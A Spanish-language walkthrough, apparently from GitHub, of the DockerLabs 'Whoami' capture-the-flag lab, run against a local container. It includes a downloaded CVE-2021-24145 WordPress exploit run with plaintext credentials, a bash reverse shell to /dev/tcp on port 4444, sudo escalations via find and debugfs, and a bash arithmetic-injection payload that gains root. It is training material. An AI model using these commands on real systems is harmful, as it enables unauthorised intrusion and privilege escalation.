### Whoami -DockerLabs 🇪🇸


#### 1. En primer lugar vamos a desempaquetar el archivo y procedemos a moverlo a nuestra zona de trabajo.
```bash
 unzip whoiam.zip 
```

<img width="903" height="219" alt="image" src="https://github.com/user-attachments/assets/fdd5b0ee-be9d-45ba-a863-2dfa5acab12d" />


#### 1.2 Ahora encendremos el laboratorio.
```bash
sudo bash ./auto_deploy.sh whoiam.tar 
```

<img width="896" height="481" alt="image" src="https://github.com/user-attachments/assets/2dbefe08-7e8a-4a6b-9a6c-01995a51bcba" />


#### 2. EN primer lugar comprobaremos la conexión mediante un ping.
```bash
 ping -c3 172.19.0.2
```

<img width="897" height="238" alt="image" src="https://github.com/user-attachments/assets/8dbee06f-422a-4528-8551-8c2326c488a2" />


#### 3. Ahora vamos a proceder a hacer un rastreo de puertos mediante la herramienta nmap.
```bash
 nmap -sCV 172.19.0.2
```

<img width="899" height="285" alt="image" src="https://github.com/user-attachments/assets/29708eef-571c-4799-aa64-e3b101a4b328" />


#### 4. Sabiendo de que unicamente esta abierto es http en el puerto 80 iremos a la pagina web.


<img width="1017" height="599" alt="image" src="https://github.com/user-attachments/assets/2a1ec4f9-7977-4f32-874e-af93b2877432" />


#### 5. Viendo que es una web muy sencilla realizaremos un gobuster para ver si tiene directorios ocultos
```bash
 gobuster dir -u http://172.19.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -r
```

<img width="888" height="646" alt="image" src="https://github.com/user-attachments/assets/400ec34f-53a3-4ae2-b0d8-0e196d1a5f0e" />


#### 6. Encontramos un panel de inicio de sesion el cual podemos forzar para entrar.


<img width="998" height="743" alt="image" src="https://github.com/user-attachments/assets/7e350d87-31aa-41a4-8000-7fe32f2e64a4" />


#### 7. Después de probar alguna inyección sin dar reasultador iremos a donde las backups y descargaremos el archivo.

<img width="1016" height="636" alt="image" src="https://github.com/user-attachments/assets/0c38f62f-8f07-43cc-911f-3a38e2e86dff" />


#### 8. Trataremos de descomprimirlo 

<img width="898" height="198" alt="image" src="https://github.com/user-attachments/assets/3e0f2f68-2e50-458b-9f4e-53c5f33f0d7d" />


#### 8.2 Y procedemos a leerlo mediante cat.
```bash
cat 29DBMay 
```

<img width="905" height="159" alt="image" src="https://github.com/user-attachments/assets/f464bf19-6d02-4247-8729-c0d5c21661ff" />


#### 8.3 Entraremos con esas credenciales al login en el cual nos encontrabamos antes.

<img width="1016" height="1005" alt="image" src="https://github.com/user-attachments/assets/ded93544-01aa-46fe-a92f-29bf3d4af22f" />


#### 8.4 Viendo dentro del perfil podemos ver en los plugins algo sospechoso, un plugin diferente el cual es https://github.com/dnr6419/CVE-2021-24145 

*Lo descagamos*
```bash
wget https://raw.githubusercontent.com/dnr6419/CVE-2021-24145/refs/heads/main/poc.py
```

*Lo ejecutamos mediante python y las credenciales que teniamos.*
```bash
 python3 poc.py -T 172.19.0.2 -P 80 -U / -u developer -p 2wmy3KrGDRD%RsA7Ty5n71L^
```

<img width="839" height="739" alt="image" src="https://github.com/user-attachments/assets/e01228a3-3fb9-4256-9d76-36dfb4b90b56" />


#### 8.5 Viendo la web que nos ha facilitado el python entraremos y veremos una terminal.

<img width="987" height="709" alt="image" src="https://github.com/user-attachments/assets/db212aa0-fa65-4e35-b92d-2e2778c69717" />


#### 8.6 Ejecutaremos el expluit para pasarlo a nuestra terminal mediante el escucha de nc.
```bash
penelope -p 4444
bash -c "bash -i >& /dev/tcp/172.19.0.1/4444 0>&1"
```

<img width="1919" height="727" alt="image" src="https://github.com/user-attachments/assets/cdf3b7e0-a565-45e6-acba-c0ea66e638e9" />


#### 9. Vamos a empezar a buscar la escala de privilegios, primero miraremos los binarios que podemmos ejecutar con `sudo -l`

<img width="891" height="262" alt="image" src="https://github.com/user-attachments/assets/539cb03c-dee6-47e9-940f-ab61e6ab8c93" />


#### 9.2 Viendo que Rafa puede ejecutar el binario de /usr/bin/fin ejecutaremos este exploit.
```bash
sudo -u rafa /usr/bin/find . -exec /bin/bash \; -quit
```

<img width="903" height="88" alt="image" src="https://github.com/user-attachments/assets/647159b2-4ef8-422f-a283-3ffd5108aec9" />


#### 9.3 Ahora ejecutaremos lo mismo, `sudo -l` con rafa para ver que RUben tiene privilegios en binarios debugfs.
https://gtfobins.org/gtfobins/debugfs/
```bash
sudo -u ruben /usr/sbin/debugfs
!/bin/bash
```

<img width="891" height="329" alt="image" src="https://github.com/user-attachments/assets/335ba124-7f69-48b6-8094-74ac41135a3a" />


#### 9.4 Ahora ejecutaremos `sudo -l` y vemos que podemos ejecutar un python llamado penguin.sh.

<img width="894" height="418" alt="image" src="https://github.com/user-attachments/assets/f2318556-3a08-49e7-83f0-64e51e2da885" />


#### 9.5 Ahora para escalar privilegios veremos que ese python compara la entrada con el numero de el cual haya sido ingresado el comando correctamente.
```bash
sudo /bin/bash /opt/penguin.sh
42+a[$(whoami >&2)]
```

<img width="890" height="511" alt="image" src="https://github.com/user-attachments/assets/179c4f68-c43a-467b-9e3d-21791c177636" />


#### 10. Por último podremos ver que ejecutando `bash -p` vas a ascender a root como si tuvieses el binario de la shell.
```bash
sudo /bin/bash /opt/penguin.sh
42+b[$(bash -p >&2)]
```

<img width="896" height="160" alt="image" src="https://github.com/user-attachments/assets/c5b5cb4b-b139-4826-a15c-c65d4997553f" />







